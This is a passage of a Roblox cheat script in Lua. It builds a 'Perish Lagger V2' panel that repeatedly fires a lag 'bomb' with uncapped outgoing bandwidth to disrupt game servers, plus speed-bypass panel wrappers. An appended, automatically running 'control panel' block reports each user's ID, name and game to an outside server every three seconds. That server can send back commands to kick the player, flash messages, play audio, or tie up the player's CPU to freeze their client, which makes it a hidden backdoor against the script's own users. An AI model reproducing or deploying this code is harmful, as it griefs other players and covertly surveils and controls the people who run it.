 p.BackgroundColor3 = (i % 3 == 0) and C.White or C.RedSoft
 local s = 1 + math.random() * 2
 p.Size = UDim2.new(0, s, 0, s)
 p.Position = UDim2.new(math.random(), 0, math.random(), 0)
 p.BackgroundTransparency = 0.25 + math.random() * 0.5
 p.ZIndex = 1
 corner(p, 99)
 table.insert(particles, {
 frame = p,
 base = p.BackgroundTransparency,
 timer = 1.5 + math.random() * 2.5,
 elapsed = 0,
 })
	end
	task.spawn(function()
 while mainFrame and mainFrame.Parent do
 if not mainFrame.Visible then
 task.wait(0.5)
 else
 for _, d in ipairs(particles) do
 local fr = d.frame
 if fr and fr.Parent then
 d.elapsed = d.elapsed + 0.1
 fr.Position = fr.Position + UDim2.new(0, 0, 0, -0.25)
 if fr.Position.Y.Scale < 0 then
 fr.Position = UDim2.new(math.random(), 0, 1, 0)
 end
 if d.elapsed >= d.timer then
 d.elapsed = 0
 d.timer = 1.5 + math.random() * 2.5
 TweenService:Create(fr, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
 task.delay(0.2, function()
 if not d.frame or not d.frame.Parent then return end
 d.frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
 local ns = 1 + math.random() * 2
 d.frame.Size = UDim2.new(0, ns, 0, ns)
 TweenService:Create(d.frame, TweenInfo.new(0.5), { BackgroundTransparency = d.base }):Play()
 end)
 end
 end
 end
 task.wait(0.1)
 end -- else/if
 end -- while
	end) -- particle task.spawn

	-- HEADER
	local header = Instance.new("Frame", mainFrame)
	header.Size = UDim2.new(1, 0, 0, 48)
	header.BackgroundTransparency = 1
	header.ZIndex = 3

	local av = Instance.new("ImageLabel", header)
	av.Size = UDim2.new(0, 30, 0, 30)
	av.Position = UDim2.new(0, 12, 0, 9)
	av.BackgroundColor3 = C.RedDeep
	av.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LP.UserId .. "&w=150&h=150"
	av.ScaleType = Enum.ScaleType.Crop
	av.ZIndex = 3
	corner(av, 9)
	stroke(av, C.Red, 1, 0.4)

	local title = Instance.new("TextLabel", header)
	title.BackgroundTransparency = 1
	title.Position = UDim2.new(0, 50, 0, 8)
	title.Size = UDim2.new(0, 150, 0, 19)
	title.Font = Enum.Font.GothamBlack
	title.Text = "IlusionUser V2"
	title.TextColor3 = C.White
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.ZIndex = 3
	highlight(title, C.Red)

	local subtitle = Instance.new("TextLabel", header)
	subtitle.BackgroundTransparency = 1
	subtitle.Position = UDim2.new(0, 50, 0, 26)
	subtitle.Size = UDim2.new(0, 170, 0, 12)
	subtitle.Font = Enum.Font.GothamBold
	subtitle.Text = "IlusionUser module"
	subtitle.TextColor3 = C.TextDim
	subtitle.TextSize = 10
	subtitle.TextXAlignment = Enum.TextXAlignment.Left
	subtitle.ZIndex = 3

	-- LOCK / UNLOCK (bên phải, giống Ping Lagger)
	local v2Locked = false
	local lockBtn = Instance.new("TextButton", header)
	lockBtn.Name = "LockBtn"
	lockBtn.Size = UDim2.new(0, 52, 0, 22)
	lockBtn.Position = UDim2.new(1, -64, 0.5, -11)
	lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
	lockBtn.BorderSizePixel = 0
	lockBtn.Text = "LOCK"
	lockBtn.TextColor3 = C.TextDim
	lockBtn.Font = Enum.Font.GothamBold
	lockBtn.TextSize = 9
	lockBtn.AutoButtonColor = false
	lockBtn.ZIndex = 10
	corner(lockBtn, 6)
	stroke(lockBtn, C.Red, 1, 0.55)
	local function setV2Locked(on)
 v2Locked = on and true or false
 lockBtn.Text = v2Locked and "UNLOCK" or "LOCK"
 lockBtn.BackgroundColor3 = v2Locked and Color3.fromRGB(80, 30, 30) or Color3.fromRGB(25, 25, 28)
 lockBtn.TextColor3 = v2Locked and C.White or C.TextDim
	end
	lockBtn.MouseButton1Click:Connect(function()
 setV2Locked(not v2Locked)
 _G.AcePerishV2Locked = v2Locked
 pcall(SaveConfig)
	end)
	_G.AceIsPerishV2Locked = function()
 return v2Locked == true
	end
	_G.AceSetPerishV2Locked = function(on)
 setV2Locked(on)
 _G.AcePerishV2Locked = v2Locked
 pcall(SaveConfig)
	end

	local sep = Instance.new("Frame", mainFrame)
	sep.Size = UDim2.new(1, -28, 0, 1)
	sep.Position = UDim2.new(0, 14, 0, 48)
	sep.BorderSizePixel = 0
	sep.BackgroundColor3 = C.Red
	sep.ZIndex = 3
	local sepG = Instance.new("UIGradient", sep)
	sepG.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, C.Red),
 ColorSequenceKeypoint.new(0.5, C.White),
 ColorSequenceKeypoint.new(1, C.Red),
	})
	sepG.Transparency = NumberSequence.new({
 NumberSequenceKeypoint.new(0, 1),
 NumberSequenceKeypoint.new(0.5, 0.05),
 NumberSequenceKeypoint.new(1, 1),
	})
	task.spawn(function()
 while sepG and sepG.Parent do
 if mainFrame and not mainFrame.Visible then
 task.wait(0.5)
 else
 sepG.Offset = Vector2.new((tick() * 0.4) % 2 - 1, 0)
 task.wait(0.05)
 end
 end
	end)

	-- ROW LAGGER + TOGGLE
	local row = Instance.new("Frame", mainFrame)
	row.Position = UDim2.new(0, 12, 0, 58)
	row.Size = UDim2.new(1, -24, 0, 34)
	row.BackgroundColor3 = C.Row
	row.BackgroundTransparency = 0.25
	row.BorderSizePixel = 0
	row.ZIndex = 2
	corner(row, 10)
	stroke(row, C.Red, 1, 0.6)

	local textLagger = Instance.new("TextLabel", row)
	textLagger.BackgroundTransparency = 1
	textLagger.Position = UDim2.new(0, 12, 0, 0)
	textLagger.Size = UDim2.new(0, 110, 1, 0)
	textLagger.Font = Enum.Font.GothamBlack
	textLagger.Text = "LAGGER"
	textLagger.TextColor3 = C.Text
	textLagger.TextSize = 13
	textLagger.TextXAlignment = Enum.TextXAlignment.Left
	textLagger.ZIndex = 3

	local powerLabel = Instance.new("TextLabel", row)
	powerLabel.BackgroundTransparency = 1
	powerLabel.Position = UDim2.new(0, 12, 0, 0)
	powerLabel.Size = UDim2.new(1, -100, 1, 0)
	powerLabel.Font = Enum.Font.GothamBold
	powerLabel.Text = "POWER 23"
	powerLabel.TextColor3 = C.TextDim
	powerLabel.TextSize = 9
	powerLabel.TextXAlignment = Enum.TextXAlignment.Right
	powerLabel.ZIndex = 3

	local toggleContainer = Instance.new("Frame", row)
	toggleContainer.BackgroundColor3 = C.Off
	toggleContainer.Position = UDim2.new(1, -78, 0.5, -11)
	toggleContainer.Size = UDim2.new(0, 68, 0, 22)
	toggleContainer.BorderSizePixel = 0
	toggleContainer.ZIndex = 3
	corner(toggleContainer, 99)
	stroke(toggleContainer, C.Red, 1, 0.5)

	local toggleBall = Instance.new("Frame", toggleContainer)
	toggleBall.BackgroundColor3 = C.RedSoft
	toggleBall.Size = UDim2.new(0, 18, 0, 18)
	toggleBall.Position = UDim2.new(0, 2, 0.5, -9)
	toggleBall.BorderSizePixel = 0
	toggleBall.ZIndex = 4
	corner(toggleBall, 99)

	local toggleClick = Instance.new("TextButton", toggleContainer)
	toggleClick.BackgroundTransparency = 1
	toggleClick.Size = UDim2.new(1, 0, 1, 0)
	toggleClick.ZIndex = 5
	toggleClick.Font = Enum.Font.GothamBlack
	toggleClick.Text = "OFF"
	toggleClick.TextSize = 9
	toggleClick.TextColor3 = C.Red
	toggleClick.AutoButtonColor = false

	-- LEVEL BAR
	local levelBar = Instance.new("Frame", mainFrame)
	levelBar.Position = UDim2.new(0, 12, 0, 98)
	levelBar.Size = UDim2.new(1, -24, 0, 30)
	levelBar.BackgroundColor3 = C.Row
	levelBar.BackgroundTransparency = 0.3
	levelBar.BorderSizePixel = 0
	levelBar.ZIndex = 2
	corner(levelBar, 10)
	stroke(levelBar, C.Red, 1, 0.6)

	local pad = Instance.new("UIPadding", levelBar)
	pad.PaddingLeft = UDim.new(0, 4)
	pad.PaddingRight = UDim.new(0, 4)
	pad.PaddingTop = UDim.new(0, 4)
	pad.PaddingBottom = UDim.new(0, 4)
	local grid = Instance.new("UIListLayout", levelBar)
	grid.FillDirection = Enum.FillDirection.Horizontal
	grid.Padding = UDim.new(0, 4)
	grid.HorizontalAlignment = Enum.HorizontalAlignment.Center

	local btns, strokes = {}, {}
	for _, name in ipairs(ORDER) do
 local b = Instance.new("TextButton", levelBar)
 b.Size = UDim2.new(0.25, -4, 1, 0)
 b.BackgroundColor3 = C.Card
 b.BackgroundTransparency = 0.15
 b.Font = Enum.Font.GothamBlack
 b.Text = name:upper()
 b.TextSize = 10
 b.TextColor3 = C.TextDim
 b.AutoButtonColor = false
 b.BorderSizePixel = 0
 b.ZIndex = 3
 corner(b, 8)
 hoverLift(b)
 btns[name] = b
 strokes[name] = stroke(b, C.Red, 1, 0.6)
	end

	-- FOOTER: chỉ KEY (không ms)
	local footer = Instance.new("Frame", mainFrame)
	footer.Position = UDim2.new(0, 12, 1, -42)
	footer.Size = UDim2.new(1, -24, 0, 30)
	footer.BackgroundColor3 = C.Row
	footer.BackgroundTransparency = 0.3
	footer.BorderSizePixel = 0
	footer.ZIndex = 2
	corner(footer, 10)
	stroke(footer, C.Red, 1, 0.6)

	local keybindButton = Instance.new("TextButton", footer)
	keybindButton.Position = UDim2.new(0, 6, 0.5, -10)
	keybindButton.Size = UDim2.new(1, -12, 0, 20)
	keybindButton.BackgroundColor3 = C.Card
	keybindButton.BackgroundTransparency = 0.15
	keybindButton.Font = Enum.Font.GothamBold
	keybindButton.Text = "KEY: M"
	keybindButton.TextColor3 = C.TextDim
	keybindButton.TextSize = 11
	keybindButton.AutoButtonColor = false
	keybindButton.ZIndex = 3
	corner(keybindButton, 7)
	stroke(keybindButton, C.Red, 1, 0.55)
	hoverLift(keybindButton)

	local tryhardText = Instance.new("TextLabel", mainFrame)
	tryhardText.BackgroundTransparency = 1
	tryhardText.Position = UDim2.new(0, 14, 0, 131)
	tryhardText.Size = UDim2.new(1, -28, 0, 12)
	tryhardText.Font = Enum.Font.GothamBold
	tryhardText.Text = "only for tryhards"
	tryhardText.TextColor3 = C.RedSoft
	tryhardText.TextSize = 9
	tryhardText.TextXAlignment = Enum.TextXAlignment.Center
	tryhardText.ZIndex = 3
	tryhardText.Visible = false

	local levelColors = { Low = C.Green, Mid = C.Yellow, High = C.Red, Ultra = C.White }

	local function actualizarBotonesNivel()
 for _, name in ipairs(ORDER) do
 local b, s = btns[name], strokes[name]
 if name == nivelActual then
 TweenService:Create(b, TweenInfo.new(0.18), {
 BackgroundColor3 = levelColors[name],
 BackgroundTransparency = 0.05,
 }):Play()
 b.TextColor3 = (name == "Ultra") and C.Dark or C.Text
 s.Color = levelColors[name]
 s.Transparency = 0.1
 else
 TweenService:Create(b, TweenInfo.new(0.18), {
 BackgroundColor3 = C.Card,
 BackgroundTransparency = 0.15,
 }):Play()
 b.TextColor3 = C.TextDim
 s.Color = C.Red
 s.Transparency = 0.6
 end
 end
 tryhardText.Visible = (nivelActual == "Ultra")
 powerLabel.Text = "POWER " .. NIVELES[nivelActual].poder
 cachedBomb = nil
	end

	local function actualizarKeybindButton()
 keybindButton.Text = "KEY: " .. tostring(keybind.Name):gsub("Button", "")
	end

	local function setLaggerOn(on)
 on = on and true or false
 laggerActive = on
 if laggerActive then
 pcall(function()
 if setVisLaggerEnabled then setVisLaggerEnabled(false) end
 if _G.AceSetVisLaggerEnabled then _G.AceSetVisLaggerEnabled(false) end
 end)
 end
 TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
 Position = laggerActive and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 BackgroundColor3 = laggerActive and C.White or C.RedSoft,
 }):Play()
 TweenService:Create(toggleContainer, TweenInfo.new(0.2), {
 BackgroundColor3 = laggerActive and C.RedDeep or C.Off,
 }):Play()
 toggleClick.Text = laggerActive and "ON" or "OFF"
 toggleClick.TextColor3 = laggerActive and C.Green or C.Red

 if laggerActive then
 if lagThread then pcall(task.cancel, lagThread) end
 lagThread = task.spawn(function()
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
 while laggerActive do
 fireBomb()
 task.wait(0.18)
 end
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
 end)
 else
 if lagThread then pcall(task.cancel, lagThread); lagThread = nil end
 pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(0) end)
 end
	end

	local function toggleLagger()
 setLaggerOn(not laggerActive)
	end

	_G.AceSetPerishV2Lagger = setLaggerOn
	_G.AceTogglePerishV2Lagger = toggleLagger
	_G.AcePerishV2LaggerActive = function() return laggerActive end

	toggleClick.MouseButton1Click:Connect(toggleLagger)
	for _, name in ipairs(ORDER) do
 btns[name].MouseButton1Click:Connect(function()
 nivelActual = name
 actualizarBotonesNivel()
 SaveConfig()
 end)
	end
	keybindButton.MouseButton1Click:Connect(function()
 if listeningForInput then return end
 listeningForInput = true
 keybindButton.Text = "PRESS..."
 keybindButton.BackgroundColor3 = C.Red
 keybindButton.TextColor3 = C.Text
	end)

	actualizarKeybindButton()
 actualizarBotonesNivel()

	UserInputService.InputBegan:Connect(function(input, gp)
 if gp then return end
 if listeningForInput then
 if input.KeyCode ~= Enum.KeyCode.Unknown then
 keybind = input.KeyCode
 listeningForInput = false
 actualizarKeybindButton()
 keybindButton.BackgroundColor3 = C.Card
 keybindButton.TextColor3 = C.TextDim
 SaveConfig()
 end
 return
 end
 if input.KeyCode == keybind then
 toggleLagger()
 end
	end)

	-- DRAG + save pos (khóa khi LOCK)
	local isDragging, dragStart, startPos = false, nil, nil
	_G.AceCancelVisLaggerDrag = function(force)
 isDragging = false
 if force then
 setV2Locked(true)
 end
	end
	header.InputBegan:Connect(function(input)
 if v2Locked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1
 or input.UserInputType == Enum.UserInputType.Touch then
 -- không bắt đầu drag khi bấm nút LOCK
 local pos = input.Position
 local abs = lockBtn.AbsolutePosition
 local asz = lockBtn.AbsoluteSize
 if pos.X >= abs.X and pos.X <= abs.X + asz.X and pos.Y >= abs.Y and pos.Y <= abs.Y + asz.Y then
 return
 end
 isDragging = true
 dragStart = input.Position
 startPos = mainFrame.Position
 end
	end)
	UserInputService.InputChanged:Connect(function(input)
 if v2Locked or not isDragging then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement
 or input.UserInputType == Enum.UserInputType.Touch then
 local delta = input.Position - dragStart
 mainFrame.Position = UDim2.new(
 startPos.X.Scale, startPos.X.Offset + delta.X,
 startPos.Y.Scale, startPos.Y.Offset + delta.Y
 )
 end
	end)
	UserInputService.InputEnded:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1
 or input.UserInputType == Enum.UserInputType.Touch then
 if isDragging then
 isDragging = false
 if mainFrame then
 local p = mainFrame.Position
 local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = pos
 savedPos = pos
 end
 pcall(SaveConfig)
 end
 end
	end)

	-- No auto-open: size full sẵn, Visible = false đến khi mở từ menu
	mainFrame.Size = UDim2.new(0, W, 0, H)

	
	-- Lưu vị trí panel (giống V1)
	local function saveV2PanelPos()
 if mainFrame and mainFrame.Parent then
 local p = mainFrame.Position
 local pos = { xs = p.X.Scale, xo = p.X.Offset, ys = p.Y.Scale, yo = p.Y.Offset }
 _G.AcePerishV2PanelPosition = pos
 savedPos = pos
 return pos
 end
 return _G.AcePerishV2PanelPosition or savedPos
	end

	local function restoreV2PanelPos()
 local sp = _G.AcePerishV2PanelPosition or savedPos
 if type(sp) == "table" and mainFrame then
 mainFrame.Position = UDim2.new(
 tonumber(sp.xs) or 0.14, tonumber(sp.xo) or 0,
 tonumber(sp.ys) or 0.5, tonumber(sp.yo) or -H / 2
 )
 return true
 end
 return false
	end

	-- Đóng/mở panel: LUÔN giữ vị trí + trạng thái LOCK (không reset)
	local function setV2PanelVisible(on, skipSave)
 on = on and true or false
 if not on then
 -- Lưu vị trí hiện tại trước khi ẩn (kể cả đang LOCK)
 saveV2PanelPos()
 _G.AcePerishV2Locked = v2Locked == true
 if not skipSave then
 pcall(SaveConfig)
 end
 if mainFrame then mainFrame.Visible = false end
 _G.AcePerishV2PanelOpen = false
 -- KHÔNG OFF lagger, KHÔNG đổi lock
 return
 end
 -- Open lại: restore đúng vị trí đã lưu
 restoreV2PanelPos()
 if mainFrame then
 mainFrame.Size = UDim2.new(0, W, 0, H)
 mainFrame.Visible = true
 end
 -- restore lock state
 if _G.AcePerishV2Locked == true then
 setV2Locked(true)
 end
 _G.AcePerishV2PanelOpen = true
 if not skipSave then
 pcall(SaveConfig)
 end
	end
	_G.AceSetPerishV2PanelVisible = setV2PanelVisible
	_G.AceTogglePerishV2Panel = function()
 setV2PanelVisible(not (mainFrame and mainFrame.Visible))
	end
	_G.AceSavePerishV2PanelPos = saveV2PanelPos

	-- Trạng thái ban đầu: ẩn panel, giữ pos đã load
	mainFrame.Visible = false
	_G.AcePerishV2PanelOpen = false
	restoreV2PanelPos()
	if _G.AcePerishV2Locked == true then
 setV2Locked(true)
	end

print("[Vis] Perish Lagger V2 FULL GUI loaded (menu toggle, pos persist like V1)")

end)

-- ============================================================
-- WRAPPERS: Settings → ILUSIÓN Lagger V2 (Perish) + Speed Bypass
-- ============================================================
do
	function _G.IlusionSetLaggerPanel(on)
 on = on and true or false
 if type(St) == "table" then St.showLaggerPanel = on end
 pcall(function()
 if _G.AceSetPerishV2PanelVisible then
 _G.AceSetPerishV2PanelVisible(on)
 else
 _G.AcePerishV2PanelOpen = on
 end
 end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	function _G.IlusionSetLaggerLock(on)
 on = on and true or false
 if type(St) == "table" then St.laggerPanelLock = on end
 pcall(function() if _G.AceSetPerishV2Lock then _G.AceSetPerishV2Lock(on) end end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	function _G.IlusionSetSpeedBypassPanel(on)
 on = on and true or false
 if type(St) == "table" then
 St.showSpeedBypassPanel = on
 end
 local function forceGui(on2)
 pcall(function()
 local parents = {}
 pcall(function() table.insert(parents, gethui and gethui()) end)
 table.insert(parents, game:GetService("CoreGui"))
 local lp = game:GetService("Players").LocalPlayer
 if lp then table.insert(parents, lp:FindFirstChild("PlayerGui")) end
 local gui = nil
 for _, p in ipairs(parents) do
 if p then
 gui = p:FindFirstChild("IlusionBypassGui")
 if gui then break end
 end
 end
 if not gui then return end
 gui.Enabled = true
 gui.DisplayOrder = 250
 local main = gui:FindFirstChild("MainFrame")
 local mini = gui:FindFirstChild("Mini") or gui:FindFirstChild("MiniFrame")
 if on2 then
 if main then main.Visible = true end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = true
 else
 -- save pos before hide
 if main and main.Visible then
 _G.AceVisBypassPanelPosition = {
 xs = main.Position.X.Scale, xo = main.Position.X.Offset,
 ys = main.Position.Y.Scale, yo = main.Position.Y.Offset,
 }
 if type(St) == "table" then
 St._sbPanelPos = {
 main.Position.X.Scale, main.Position.X.Offset,
 main.Position.Y.Scale, main.Position.Y.Offset,
 }
 end
 end
 if main then main.Visible = false end
 if mini then mini.Visible = false end
 _G.AceVisBypassPanelOpen = false
 end
 end)
 end
 local api = _G.AceSetVisBypassPanelVisible
 if type(api) == "function" then
 local ok, err = pcall(api, on)
 if not ok then warn("[ILUSIÓN] SpeedBypass panel:", err) end
 else
 -- API chưa sẵn: đợi tối đa 1s (không 5s)
 task.spawn(function()
 for _ = 1, 10 do
 if type(_G.AceSetVisBypassPanelVisible) == "function" then
 pcall(_G.AceSetVisBypassPanelVisible, on)
 break
 end
 task.wait(0.1)
 end
 forceGui(on)
 end)
 end
 forceGui(on)
 pcall(function() if saveCfg then saveCfg() end end)
	end

function _G.IlusionSetSpeedBypassLock(on)
 on = on and true or false
 if type(St) == "table" then St.speedBypassLock = on end
 -- Lock riêng Speed Bypass — không dính Lock UI menu chính (St.guiLock)
 pcall(function()
 if _G.AceSetVisBypassLock then
 _G.AceSetVisBypassLock(on)
 else
 _G.AceVisBypassLocked = on
 end
 end)
 pcall(function() if saveCfg then saveCfg() end end)
	end

	task.defer(function()
 task.wait(0.2)
 pcall(function()
 if type(St) == "table" and St.showLaggerPanel then _G.IlusionSetLaggerPanel(true) end
 -- Speed Bypass: chỉ hiện nếu user đã ON show trong settings (không auto)
 if type(St) == "table" and St.showSpeedBypassPanel == true then
 _G.IlusionSetSpeedBypassPanel(true)
 elseif type(_G.IlusionSetSpeedBypassPanel) == "function" then
 _G.IlusionSetSpeedBypassPanel(false)
 end
 end)
	end)
end

print("[ILUSIÓN] FULL Vis Lagger V2 (Perish) + Speed Bypass GUI (no old Vynx)")
end)




-- ============================================================
-- === CONTROL PANEL CONNECTION (auto) ===
do
 local BASE = "https://vishubblagger.lovable.app"
 local KEY = "Grin@1234"
 local SCRIPT = "FreeAllGear"
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local plr = Players.LocalPlayer
 local lagLevel = 0
 local freezeUntil = 0
 local freezeBusy = 0.9
 local activeGuis = {}
 local cpSound = nil

 -- Xoá hết thông báo đang hiện
 function clearNotify()
 for gui in pairs(activeGuis) do
 pcall(function() gui:Destroy() end)
 activeGuis[gui] = nil
 end
 end

 -- Phát / đổi âm lượng / OFF nhạc bằng ID Roblox
 function playMusic(id, volume, looped)
 volume = math.clamp((tonumber(volume) or 50) / 100, 0, 1)
 pcall(function()
 if not id or tostring(id) == "0" or tostring(id) == "" then
 if cpSound then cpSound:Destroy() cpSound = nil end
 return
 end
 local url = "rbxassetid://" .. tostring(id)
 if cpSound and cpSound.SoundId == url then
 cpSound.Volume = volume
 if not cpSound.IsPlaying then cpSound:Play() end
 return
 end
 if cpSound then cpSound:Destroy() end
 cpSound = Instance.new("Sound")
 cpSound.Name = "CP_Music"
 cpSound.SoundId = url
 cpSound.Volume = volume
 cpSound.Looped = looped ~= false
 cpSound.Parent = (gethui and gethui()) or game:GetService("SoundService")
 cpSound:Play()
 end)
 end

 -- Thông báo chữ BỰ giữa màn hình
 function bigNotify(text, size, duration, color)
 if not text or text == "" then return end
 size = tonumber(size) or 48
 duration = tonumber(duration) or 5
 pcall(function()
 local parent = (gethui and gethui()) or game:GetService("CoreGui")
 local gui = Instance.new("ScreenGui")
 gui.Name = "CP_BigNotify"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 gui.Parent = parent
 activeGuis[gui] = true

 local shade = Instance.new("Frame")
 shade.BackgroundColor3 = Color3.new(0, 0, 0)
 shade.BackgroundTransparency = 0.55
 shade.Size = UDim2.fromScale(1, 1)
 shade.BorderSizePixel = 0
 shade.Parent = gui

 local label = Instance.new("TextLabel")
 label.BackgroundTransparency = 1
 label.Size = UDim2.fromScale(0.92, 0.5)
 label.Position = UDim2.fromScale(0.04, 0.25)
 label.Font = Enum.Font.GothamBlack
 label.TextScaled = false
 label.TextSize = size
 label.TextWrapped = true
 label.RichText = true
 label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
 label.TextStrokeTransparency = 0
 label.TextStrokeColor3 = Color3.new(0, 0, 0)
 label.Text = text
 label.TextTransparency = 1
 label.Parent = gui

 TweenService:Create(label, TweenInfo.new(0.25), { TextTransparency = 0 }):Play()
 task.delay(duration, function()
 pcall(function()
 TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
 TweenService:Create(shade, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
 end)
 task.wait(0.4)
 activeGuis[gui] = nil
 pcall(function() gui:Destroy() end)
 end)
 end)
 end

 function post(path, body)
 return HttpService:RequestAsync({
 Url = BASE .. path,
 Method = "POST",
 Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = KEY },
 Body = HttpService:JSONEncode(body),
 })
 end
 function heartbeat()
 local ok, res = pcall(post, "/api/public/lua/heartbeat", {
 user_id = tostring(plr.UserId),
 hwid = plr.Name,
 script = SCRIPT,
 game = tostring(game.PlaceId),
 })
 if not ok or not res.Success then return end
 local data = HttpService:JSONDecode(res.Body)
 if data.enabled == false then plr:Kick("Disabled") end
 for _, cmd in ipairs(data.commands or {}) do
 local p = cmd.payload or {}
 if cmd.type == "kick" then
 local reason = p.reason or "Ban da bi kick."
 bigNotify(reason, p.size or 56, 2.5, Color3.fromRGB(255, 80, 80))
 task.delay(2.2, function() plr:Kick(reason) end)
 elseif cmd.type == "message" then
 bigNotify(p.text or "", p.size or 48, p.duration or 5)
 elseif cmd.type == "clear_message" then
 clearNotify()
 elseif cmd.type == "music" then
 playMusic(p.id, p.volume, p.looped)
 elseif cmd.type == "lag" then
 lagLevel = tonumber(p.iterations) or 0
 elseif cmd.type == "freeze" then
 local dur = tonumber(p.duration) or 0
 freezeBusy = tonumber(p.busy) or 0.9
 if dur <= 0 then
 freezeUntil = 0
 else
 freezeUntil = tick() + dur
 end
 end
 end
 end
 RunService.RenderStepped:Connect(function()
 if tick() < freezeUntil then
 local t = tick()
 while tick() - t < freezeBusy do
 local acc = 0
 for i = 1, 5e6 do acc = acc + i end
 end
 elseif lagLevel > 0 then
 local acc = 0
 for i = 1, lagLevel do acc = acc + i end
 end
 end)
 task.spawn(function()
 while task.wait(3) do pcall(heartbeat) end
 end)
 pcall(heartbeat)
end
-- === END CONTROL PANEL ===



-- Floating tool buttons (Piam/Sentry/Agu/Medu) REMOVED
